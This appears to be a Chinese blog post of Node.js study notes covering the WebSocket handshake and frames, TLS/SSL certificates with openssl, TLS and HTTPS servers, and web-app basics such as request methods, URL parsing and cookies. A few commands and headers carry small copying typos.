<figure class="highlight"><table><tr><td class="code"><pre><div class="line">GET/chat HTTP/1.1</div><div class="line">Host: server.example.com</div><div class="line">Upgrade: websocket</div><div class="line">Connection: Upgrade</div><div class="line">Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==</div><div class="line">Sec-WebSocket-Protocol: chat, </div><div class="line">superchatSec-WebSocket-Version: 13</div></pre></td></tr></table></figure>
<p>与普通的HTTP请求协议略有区别的部分在于如下这些协议头：</p>
<ul>
<li>Upgrade: websocket</li>
<li>Connection: Upgrade上述两个字段表示请求服务器端升级协议为WebSocket。<br>其中Sec-WebSocket-Key用于安全校验：</li>
<li>Sec-WebSocket-Key:dGhlIHNhbXBsZSBub25jZQ==</li>
</ul>
<p>Sec-WebSocket-Key的值是随机生成的Base64编码的字符串。</p>
<p>服务器端接收到之后将其与字符串258EAFA5-E914-47DA-95CA-C5AB0DC85B11相连，形成字符串dGhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11，然后通过sha1安全散列算法计算出结果后，再进行Base64编码，最后返回给客户端。这个算法如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</div><div class="line"><span class="keyword">var</span> val =crypto.createHash(<span class="string">'sha1'</span>).update(key).digest(<span class="string">'base64'</span>);;</div></pre></td></tr></table></figure>
<p>另外，下面两个字段指定子协议和版本号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Sec-WebSocket-Protocol: chat,</div><div class="line">superchatSec-WebSocket-Version: 13</div></pre></td></tr></table></figure>
<p>服务器端在处理完请求后，响应如下报文：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">HTTP/1.1 101 Switching ProtocolsUpgrade: websocket</div><div class="line">Connection: Upgrade</div><div class="line">Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</div><div class="line">Sec-WebSocket-Protocol: chat</div></pre></td></tr></table></figure>
<p>上面的报文告之客户端正在更换协议，更新应用层协议为WebSocket协议，并在当前的套接字连接上应用新协议。剩余的字段分别表示服务器端基于<code>Sec-WebSocket-Key</code> 生成的字符串和选中的子协议。客户端将会校验<code>Sec-WebSocket-Accept</code> 的值，如果成功，将开始接下来的数据传输。</p>
<p>一旦WebSocket握手成功，服务器端与客户端将会呈现对等的效果，都能接收和发送消息。</p>
<h3 id="7-4-2-WebSocket数据传输"><a href="#7-4-2-WebSocket数据传输" class="headerlink" title="7.4.2 WebSocket数据传输"></a>7.4.2 WebSocket数据传输</h3><p>WebSocket数据传输<br>在握手顺利完成后，当前连接将不再进行HTTP的交互，而是开始WebSocket的数据帧协议，实现客户端与服务器端的数据交换</p>
<p>握手完成后，客户端的onopen()将会被触发执行，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">socket.onopen = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; </div><div class="line">  <span class="comment">// <span class="doctag">TODO:</span> opened()</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>服务器端则没有onopen()方法可言。为了完成TCP套接字事件到WebSocket事件的封装，需要在接收数据时进行处理，WebSocket的数据帧协议即是在底层data事件上封装完成的，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">WebSocket.prototype.setSocket = <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.socket = socket;</div><div class="line">  <span class="keyword">this</span>.socket.on(<span class="string">'data'</span>, <span class="keyword">this</span>.receiver);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>同样的数据发送时，也需要做封装操作，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">WebSocket.prototype.send =</div><div class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</div><div class="line">    <span class="keyword">this</span>._send(data);</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>当客户端调用send()发送数据时，服务器端触发onmessage()；当服务器端调用send()发送数据时，客户端的onmessage()触发。当我们调用send()发送一条数据时，协议可能将这个数据封装为一帧或多帧数据，然后逐帧发送。</p>
<p>为了安全考虑，客户端需要对发送的数据帧进行掩码处理，服务器一旦收到无掩码帧（比如中间拦截破坏），连接将关闭。而服务器发送到客户端的数据帧则无须做掩码处理，同样，如果客户端收到带掩码的数据帧，连接也将关闭。</p>
<p>图7-7中为WebSocket数据帧的定义，每8位为一列，也即1个字节。其中每一位都有它的意义。<br>图7-7　WebSocket数据帧的定义</p>
<ul>
<li><code>fin</code> ： 如果这个数据帧是最后一帧，这个fin位为1，其余情况为0。当一个数据没有被分为多帧时，它既是第一帧也是最后一帧。</li>
<li><code>rsv1、rsv2、rsv3</code> ： 各为1位长，3个标识用于扩展，当有已协商的扩展时，这些值可能为1，其余情况为0。</li>
<li><code>opcode</code> ： 长为4位的操作码，可以用来表示0到15的值，用于解释当前数据帧。0表示附加数据帧，1表示文本数据帧，2表示二进制数据帧，8表示发送一个连接关闭的数据帧，9表示ping数据帧，10表示pong数据帧，其余值暂时没有定义。ping数据帧和pong数据帧用于心跳检测，当一端发送ping数据帧时，另一端必须发送pong数据帧作为响应，告知对方这一端仍然处于响应状态。</li>
<li><code>masked</code> ：表示是否进行掩码处理，长度为1。客户端发送给服务器端时为1，服务器端发送给客户端时为0。payload</li>
<li><code>length</code> ：一个7、7+16或7+64位长的数据位，标识数据的长度，如果值在0~125之间，那么该值就是数据的真实长度；如果值是126，则后面16位的值是数据的真实长度；如果值是127，则后面64位的值是数据的真实长度。</li>
<li><code>masking key</code> ：当masked为1时存在，是一个32位长的数据位，用于解密数据。payload data：我们的目标数据，位数为8的倍数。</li>
</ul>
<p>客户端发送消息时，需要构造一个或多个数据帧协议报文。由于hello world!较短，不存在分割为多个数据帧的情况，又由于hello world!会以文本的方式发送，它的payload length长度为96（12字节×8位/字节），二进制表示为1100000。</p>
<h3 id="7-4-3-小结"><a href="#7-4-3-小结" class="headerlink" title="7.4.3 小结"></a>7.4.3 小结</h3><p>在所有的WebSocket服务器端实现中，没有比Node更贴近WebSocket的使用方式了。它们的共性有以下内容。<br>基于事件的编程接口。基于JavaScript，以封装良好的WebSocket实现，API与客户端可以高度相似。<br>另外，Node基于事件驱动的方式使得它应对WebSocket这类长连接的应用场景可以轻松地处理大量并发请求。尽管Node没有内置WebSocket的库，但是社区的ws模块封装了WebSocket的底层实现。socket.io即是在它的基础上构建实现的。</p>
<h3 id="7-5-网络服务与安全"><a href="#7-5-网络服务与安全" class="headerlink" title="7.5 网络服务与安全"></a>7.5 网络服务与安全</h3><p>网络服务与安全</p>
<p>在网络中，数据在服务器端和客户端之间传递，由于是明文传递的内容，一旦在网络被人监控，数据就可能一览无余地展现在中间的窃听者面前。为此我们需要将数据加密后再进行网络传输，这样即使数据被截获和窃听，窃听者也无法知道数据的真实内容是什么。但是对于我们的应用层协议而言，如HTTP、FTP等，我们仍然希望能够透明地处理数据，而无须操心网络传输过程中的安全问题。在网景公司的NetScape浏览器推出之初就提出了 <code>SSL（Secure Sockets Layer，安全套接层）</code> 。SSL作为一种安全协议，它在传输层提供对网络连接加密的功能。对于应用层而言，它是透明的，数据在传递到应用层之前就已经完成了加密和解密的过程。最初的SSL应用在Web上，被服务器端和浏览器端同时支持，随后IETF将其标准化，称为 <code>TLS（Transport Layer Security，安全传输层协议）</code> 。</p>
<p>Node在网络安全上提供了3个模块，分别为<code>crypto</code> 、<code>tls</code>、<code>https</code>。其中<code>crypto</code> 主要用于加密解密，SHA1、MD5等加密算法都在其中有体现，在这里我们不用再提。真正用于网络的是另外两个模块，tls模块提供了与net模块类似的功能，区别在于它建立在TLS/SSL加密的TCP连接上。对于https而言，它完全与http模块接口一致，区别也仅在于它建立于安全的连接之上。</p>
<h3 id="7-5-1-TLS-SSL"><a href="#7-5-1-TLS-SSL" class="headerlink" title="7.5.1 TLS/SSL"></a>7.5.1 TLS/SSL</h3><p>密钥</p>
<p>TLS/SSL是一个公钥/私钥的结构，它是一个非对称的结构，每个服务器端和客户端都有自己的公私钥。</p>
<p>公钥用来加密要传输的数据，私钥用来解密接收到的数据。公钥和私钥是配对的，通过公钥加密的数据，只有通过私钥才能解密，所以在建立安全传输之前，客户端和服务器端之间需要互换公钥。客户端发送数据时要通过服务器端的公钥进行加密，服务器端发送数据时则需要客户端的公钥进行加密，如此才能完成加密解密的过程，如图7-8所示。图7-8　客户端和服务器端交换密钥Node在底层采用的是openssl实现TLS/SSL的，为此要生成公钥和私钥可以通过openssl完成。我们分别为服务器端和客户端生成私钥，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">// 生成服务器端私钥</div><div class="line">$ openssl genrsa -out server.key 1024</div><div class="line">// 生成客户端私钥</div><div class="line">$ openssl genrsa -out client.key 1024</div></pre></td></tr></table></figure>
<p>上述命令生成了两个1024位长的RSA私钥文件，我们可以通过它继续生成公钥，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ openssl rsa -in server.key -pubout -out server.pem$ openssl rsa -in</div><div class="line">client.key -pubout -out client.pem</div></pre></td></tr></table></figure>
<p>公私钥的非对称加密虽好，但是网络中依然可能存在窃听的情况，典型的例子是中间人攻击。客户端和服务器端在交换公钥的过程中，中间人对客户端扮演服务器端的角色，对服务器端扮演客户端的角色，因此客户端和服务器端几乎感受不到中间人的存在。为了解决这种问题，数据传输过程中还需要对得到的公钥进行认证，以确认得到的公钥是出自目标服务器。如果不能保证这种认证，中间人可能会将伪造的站点响应给用户，从而造成经济损失。图7-9是中间人攻击的示意图。图7-9　中间人攻击示意图</p>
<p>为了解决这个问题，TLS/SSL引入了数字证书来进行认证。与直接用公钥不同，数字证书中包含了服务器的名称和主机名、服务器的公钥、签名颁发机构的名称、来自签名颁发机构的签名。在连接建立前，会通过证书中的签名确认收到的公钥是来自目标服务器的，从而产生信任关系。</p>
<p>数字证书为了确保我们的数据安全，现在我们引入了一个第三方：<code>CA（CertificateAuthority，数字证书认证中心）</code> 。<br>CA的作用是为站点颁发证书，且这个证书中具有CA通过自己的公钥和私钥实现的签名。为了得到签名证书，服务器端需要通过自己的私钥生成CSR（Certificate Signing Request，证书签名请求）文件。CA机构将通过这个文件颁发属于该服务器端的签名证书，只要通过CA机构就能验证证书是否合法。通过CA机构颁发证书通常是一个烦琐的过程，需要付出一定的精力和费用。对于中小型企业而言，多半是采用自签名证书来构建安全网络的。所谓自签名证书，就是自己扮演CA机构，给自己的服务器端颁发签名证书。以下为生成私钥、生成CSR文件、通过私钥自签名生成证书的过程：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ openssl genrsa -out ca.key 1024</div><div class="line">$ openssl req -new -key ca.key -outca.csr</div><div class="line">$ openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt</div></pre></td></tr></table></figure>
<p>图7-11　客户端通过CA验证服务器端证书的真伪过程示意图CA机构将证书颁发给服务器端后，证书在请求的过程中会被发送给客户端，客户端需要通过CA的证书验证真伪。如果是知名的CA机构，它们的证书一般预装在浏览器中。如果是自己扮演CA机构，颁发自有签名证书则不能享受这个福利，客户端需要获取到CA的证书才能进行验证。上述的过程中可以看出，签名证书是一环一环地颁发的，但是在CA那里的证书是不需要上级证书参与签名的，这个证书我们通常称为根证书。</p>
<h3 id="7-5-2-TLS服务"><a href="#7-5-2-TLS服务" class="headerlink" title="7.5.2 TLS服务"></a>7.5.2 TLS服务</h3><p>创建服务器端将构建服务所需要的证书都备齐之后，我们通过Node的tls模块来创建一个安全的TCP服务，这个服务是一个简单的echo服务，代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> tls = <span class="built_in">require</span>(<span class="string">'tls'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> options = &#123;</div><div class="line">  <span class="attr">key</span>: fs.readFileSync(<span class="string">'./keys/server.key'</span>),</div><div class="line">  <span class="attr">cert</span>: fs.readFileSync(<span class="string">'./keys/server.crt'</span>),</div><div class="line">  <span class="attr">requestCert</span>: <span class="literal">true</span>,</div><div class="line">  <span class="attr">ca</span>: [fs.readFileSync(<span class="string">'./keys/ca.crt'</span>)]</div><div class="line">&#125;;</div><div class="line"><span class="keyword">var</span> server = tls.createServer(options, <span class="function"><span class="keyword">function</span> (<span class="params">stream</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'server connected'</span>, stream.authorized ? <span class="string">'authorized'</span> : <span class="string">'unauthorized'</span>);</div><div class="line">  stream.write(<span class="string">"welcome!\n"</span>);</div><div class="line">  stream.setEncoding(<span class="string">'utf8'</span>);</div><div class="line">  stream.pipe(stream);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">server.listen(<span class="number">8000</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'serverbound'</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>启动上述服务后，通过下面的命令可以测试证书是否正常：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">$ openssls_client -connect 127.0.0.1:8000</div></pre></td></tr></table></figure>
<h3 id="7-5-3-HTTPS服务"><a href="#7-5-3-HTTPS服务" class="headerlink" title="7.5.3 HTTPS服务"></a>7.5.3 HTTPS服务</h3><p>创建HTTPS服务只比HTTP服务多一个选项配置，其余地方几乎相同，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> options = &#123;</div><div class="line">  <span class="attr">key</span>: fs.readFileSync(<span class="string">'./keys/server.key'</span>),</div><div class="line">  <span class="attr">cert</span>: fs.readFileSync(<span class="string">'./keys/server.crt'</span>)</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>启动之后通过curl进行测试</p>
<p>由于是自签名的证书，curl工具无法验证服务器端证书是否正确，所以出现了上述的抛错，要解决上面的问题有两种方式。一种是加-k选项，让curl工具忽略掉证书的验证，这样的结果是数据依然会通过公钥加密传输，但是无法保证对方是可靠的，会存在中间人攻击的潜在风险。</p>
<p>另一种解决的方式是给curl设置–cacert选项，告知CA证书使之完成对服务器证书的验证，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>);</div><div class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</div><div class="line"><span class="keyword">var</span> options = &#123;</div><div class="line">  <span class="attr">hostname</span>: <span class="string">'localhost'</span>,</div><div class="line">  <span class="attr">port</span>: <span class="number">8000</span>,</div><div class="line">  <span class="attr">path</span>: <span class="string">'/'</span>,</div><div class="line">  <span class="attr">method</span>: <span class="string">'GET'</span>,</div><div class="line">  <span class="attr">key</span>: fs.readFileSync(<span class="string">'./keys/client.key'</span>),</div><div class="line">  <span class="attr">cert</span>: fs.readFileSync(<span class="string">'./keys/client.crt'</span>),</div><div class="line">  <span class="attr">ca</span>: [fs.readFileSync(<span class="string">'./keys/ca.crt'</span>)]</div><div class="line">&#125;;</div><div class="line"></div><div class="line">options.agent = <span class="keyword">new</span> https.Agent(options);</div><div class="line"><span class="keyword">var</span> req = https.request(options, <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</div><div class="line">  res.setEncoding(<span class="string">'utf-8'</span>);</div><div class="line">  res.on(<span class="string">'data'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">d</span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(d);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div><div class="line"></div><div class="line">req.end();</div><div class="line"></div><div class="line">req.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(e);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<h3 id="7-6-总结"><a href="#7-6-总结" class="headerlink" title="7.6 总结"></a>7.6 总结</h3><p>Node基于事件驱动和非阻塞设计，在分布式环境中尤其能发挥出它的特长，基于事件驱动可以实现与大量的客户端进行连接，非阻塞设计则让它可以更好地提升网络的响应吞吐。Node提供了相对底层的网络调用，以及基于事件的编程接口，使得开发者在这些模块上十分轻松地构建网络应用。下一章我们将在本章的基础上探讨具体的Web应用。</p>
<h2 id="第08章-构建Web应用"><a href="#第08章-构建Web应用" class="headerlink" title="第08章 构建Web应用"></a>第08章 构建Web应用</h2><p>如今看来，Web应用俨然是互联网的主角，伴随Web 1.0、Web 2.0一路走来，HTTP占据了网络中的大多数流量。随着移动互联网时代的到来，Web又开始在移动浏览器上发挥光和热。在Web标准化的努力过后，Web又开始朝向应用化发展，JavaScript在前端变得炙手可热</p>
<h3 id="8-1-基础功能"><a href="#8-1-基础功能" class="headerlink" title="8.1 基础功能"></a>8.1 基础功能</h3><p>非阻塞</p>
<p>事件机制</p>
<p>对于一个Web应用而言，仅仅只是上面这样的响应远远达不到业务的需求。在具体的业务中，我们可能有如下这些需求。</p>
<ul>
<li>请求方法的判断。URL的路径解析。</li>
<li>URL中查询字符串解析。Cookie的解析。</li>
<li>Basic认证。表单数据的解析。</li>
<li>任意格式文件的上传处理。</li>
</ul>
<p>除此之外，可能还有<code>Session（会话）</code> 的需求。尽管Node提供的底层API相对来说比较简单，但要完成业务需求，还需要大量的工作，仅仅一个request事件似乎无法满足这些需求。但是要实现这些需求并非难事，一切的一切，都从如下这个函数展开：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  res.writeHead(<span class="number">200</span>, &#123;</div><div class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/plain'</span></div><div class="line">  &#125;);</div><div class="line">  res.end();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在第4章中，我们曾对高阶函数有过简单的介绍：我们的应用可能无限地复杂，但是只要最终结果返回一个上面的函数作为参数，传递给createServer()方法作为request事件的侦听器就可以了。</p>
<h3 id="8-1-1-请求方法"><a href="#8-1-1-请求方法" class="headerlink" title="8.1.1 请求方法"></a>8.1.1 请求方法</h3><p>在Web应用中，最常见的请求方法是GET和POST，除此之外，还有HEAD、DELETE、PUT、CONNECT等方法。请求方法存在于报文的第一行的第一个单词，通常是大写</p>
<p>如下为一个报文头的示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET /path?foo=bar HTTP/1.1 </div><div class="line">User-Agent: curl/7.24.0(x86_64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5</div><div class="line">Host: 127.0.0.1:1337 </div><div class="line">Accept: */*</div></pre></td></tr></table></figure>
<p><code>HTTP_Parser</code>在解析请求报文的时候，将报文头抽取出来，设置为req.method。通常，我们只需要处理GET和POST两类请求方法，但是在RESTful类Web服务中请求方法十分重要，因为它会决定资源的操作行为。PUT代表新建一个资源，POST表示要更新一个资源，GET表示查看一个资源，而DELETE表示删除一个资源。</p>
<p>我们可以通过请求方法来决定响应行为，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">switch</span> (req.method) &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">'POST'</span>:</div><div class="line">      update(req, res);</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'DELETE'</span>:</div><div class="line">      remove(req, res);</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'PUT'</span>:</div><div class="line">      create(req, res);</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">'GET'</span>:</div><div class="line">    <span class="keyword">default</span>:</div><div class="line">      get(req, res);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="8-1-2-路径解析"><a href="#8-1-2-路径解析" class="headerlink" title="8.1.2 路径解析"></a>8.1.2 路径解析</h3><p>路径解析</p>
<p>除了根据请求方法来进行分发外，最常见的请求判断莫过于路径的判断了。路径部分存在于报文的第一行的第二部分，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">GET /path?foo=bar HTTP/1.1</div></pre></td></tr></table></figure>
<p><code>HTTP_Parser</code>将其解析为req.url。一般而言，完整的URL地址是如下这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">http://user:pass@host.com:8080/p/a/t/h?query=string#hash</div></pre></td></tr></table></figure>
<p>客户端代理（浏览器）会将这个地址解析成报文，将路径和查询部分放在报文第一行。需要注意的是，hash部分会被丢弃，不会存在于报文的任何地方。</p>
<h3 id="8-1-3-查询字符串"><a href="#8-1-3-查询字符串" class="headerlink" title="8.1.3 查询字符串"></a>8.1.3 查询字符串</h3><p>查询字符串</p>
<p>查询字符串位于路径之后，在地址栏中路径后的?foo=bar&amp;baz=val字符串就是查询字符串。这个字符串会跟随在路径后，形成请求报文首行的第二部分。这部分内容经常需要为业务逻辑所用，Node提供了querystring模块用于处理这部分数据，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</div><div class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</div><div class="line"><span class="keyword">var</span> query = querystring.parse(url.parse(req.url).query);</div></pre></td></tr></table></figure>
<p>更简洁的方法是给url.parse()传递第二个参数，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> query = url.parse(req.url, <span class="literal">true</span>).query;</div></pre></td></tr></table></figure>
<p>它会将foo=bar&amp;baz=val解析为一个JSON对象，如下所示：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">&#123;</div><div class="line">  foo: 'bar',</div><div class="line">  baz: 'val'</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="8-1-4-Cookie"><a href="#8-1-4-Cookie" class="headerlink" title="8.1.4 Cookie"></a>8.1.4 Cookie</h2><h3 id="初识Cookie"><a href="#初识Cookie" class="headerlink" title="初识Cookie"></a>初识Cookie</h3><p>在Web应用中，请求路径和查询字符串对业务至关重要，通过它们已经可以进行很多业务操作了，但是HTTP是一个无状态的协议，现实中的业务却是需要一定的状态的，否则无法区分用户之间的身份。如何标识和认证一个用户，最早的方案就是Cookie（曲奇饼）了</p>
<p>Cookie的处理分为如下几步。</p>
<ul>
<li>服务器向客户端发送Cookie。浏览器将Cookie保存。<br>之后每次浏览器都会将Cookie发向服务器端。客户端发送的Cookie在请求报文的Cookie字段中，我们可以通过curl工具构造这个字段，如下所示：<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl -v -H &quot;Cookie: foo=bar; baz=val&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>“<a href="http://127.0.0.1:1337/path?foo=bar&amp;foo=baz" target="_blank" rel="external">http://127.0.0.1:1337/path?foo=bar&amp;foo=baz</a>“</p>
<p>HTTP_Parser会将所有的报文字段解析到req.headers上，那么Cookie就是req.headers.cookie。根据规范中的定义，Cookie值的格式是key=value; key2=value2形式的，如果我们需要Cookie，解析它也十分容易，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> parseCookie = <span class="function"><span class="keyword">function</span> (<span class="params">cookie</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> cookies = &#123;&#125;;</div><div class="line">  <span class="keyword">if</span> (!cookie) &#123;</div><div class="line">    <span class="keyword">return</span> cookies;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">var</span> list = cookie.split(<span class="string">';'</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.length; i++) &#123;</div><div class="line">    <span class="keyword">var</span> pair = list[i].split(<span class="string">'='</span>);</div><div class="line">    cookies[pair[<span class="number">0</span>].trim()] = pair[<span class="number">1</span>];</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> cookies;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>在业务逻辑代码执行之前，我们将其挂载在req对象上，让业务代码可以直接访问，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  req.cookies = parseCookie(req.headers.cookie);</div><div class="line">  hande(req, res);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>任何请求报文中，如果Cookie值没有isVisit，都会收到“欢迎第一次来到动物园”这样的响应。这里提出一个问题，如果识别到用户没有访问过我们的站点，那么我们的站点是否应该告诉客户端已经访问过的标识呢？告知客户端的方式是通过响应报文实现的，响应的Cookie值在Set-Cookie字段中。它的格式与请求中的格式不太相同，规范中对它的定义如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Set-Cookie: name=value; </div><div class="line">Path=/; </div><div class="line">Expires=Sun, 23-Apr-23 09:01:35 GMT;</div><div class="line">Domain=.domain.com;</div></pre></td></tr></table></figure>
<p>其中name=value是必须包含的部分，其余部分皆是可选参数。这些可选参数将会影响浏览器在后续将Cookie发送给服务器端的行为</p>
<p>path表示这个Cookie影响到的路径，当前访问的路径不满足该匹配时，浏览器则不发送这个Cookie。<br>Expires和Max-Age是用来告知浏览器这个Cookie何时过期的，如果不设置该选项，在关闭浏览器时会丢失掉这个Cookie。如果设置了过期时间，浏览器将会把Cookie内容写入到磁盘中并保存，下次打开浏览器依旧有效。Expires的值是一个UTC格式的时间字符串，告知浏览器此Cookie何时将过期，Max-Age则告知浏览器此Cookie多久后过期。前者一般而言不存在问题，但是如果服务器端的时间和客户端的时间不能匹配，这种时间设置就会存在偏差。为此，Max-Age告知浏览器这条Cookie多久之后过期，而不是一个具体的时间点。</p>
<p>HttpOnly告知浏览器不允许通过脚本document.cookie去更改这个Cookie值，事实上，设置HttpOnly之后，这个值在document.cookie中不可见。但是在HTTP请求的过程中，依然会发送这个Cookie到服务器端。</p>
<p>Secure。当Secure值为true时，在HTTP中是无效的，在HTTPS中才有效，表示创建的Cookie只能在HTTPS连接中被浏览器传递到服务器端进行会话验证，如果是HTTP连接则不会传递该信息，所以很难被窃听到。</p>
<p>略改前文的访问逻辑，我们就能轻松地判断用户的状态了，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> handle = <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!req.cookies.isVisit) &#123;</div><div class="line">    res.setHeader(<span class="string">'Set-Cookie'</span>, serialize(<span class="string">'isVisit'</span>, <span class="string">'1'</span>));</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'欢迎第一次来到动物园'</span>);</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    res.writeHead(<span class="number">200</span>);</div><div class="line">    res.end(<span class="string">'动物园再次欢迎你'</span>);</div><div class="line">  &#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>值得注意的是，Set-Cookie是较少的，在报头中可能存在多个字段。为此res.setHeader的第二个参数可以是一个数组，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">res.setHeader(<span class="string">'Set-Cookie'</span>, [serialize(<span class="string">'foo'</span>, <span class="string">'bar'</span>), serialize(<span class="string">'baz'</span>, <span class="string">'val'</span>)]);</div></pre></td></tr></table></figure>
<p>这会在报文头部中形成两条Set-Cookie字段：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Set-Cookie: foo=bar</div><div class="line">Path=/</div><div class="line">Expires=Sun, 23-Apr-23 09:01:35 GMT</div><div class="line">Domain=.domain.com</div><div class="line">Set-Cookie: baz=val</div><div class="line">Path=/</div><div class="line">Expires=Sun, 23-Apr-23 09:01:35 GMT</div><div class="line">Domain=.domain.com</div></pre></td></tr></table></figure>
<h3 id="Cookie的性能影响"><a href="#Cookie的性能影响" class="headerlink" title="Cookie的性能影响"></a>Cookie的性能影响</h3><p>由于Cookie的实现机制，一旦服务器端向客户端发送了设置Cookie的意图，除非Cookie过期，否则客户端每次请求都会发送这些Cookie到服务器端，一旦设置的Cookie过多，将会导致报头较大。大多数的Cookie并不需要每次都用上，因为这会造成带宽的部分浪费。</p>
<p><strong>在YSlow的性能优化规则中有这么一条：减小Cookie的大小</strong></p>
<p>更严重的情况是，如果在域名的根节点设置Cookie，几乎所有子路径下的请求都会带上这些Cookie，这些Cookie在某些情况下是有用的，但是在有些情况下是完全无用的。其中以静态文件最为典型，静态文件的业务定位几乎不关心状态，Cookie对它而言几乎是无用的，但是一旦有Cookie设置到相同域下，它的请求中就会带上Cookie。</p>
<p>好在Cookie在设计时限定了它的域，只有域名相同时才会发送。</p>
<p><strong>所以YSlow中有另外一条规则用来避免Cookie带来的性能影响。为静态组件使用不同的域名</strong></p>
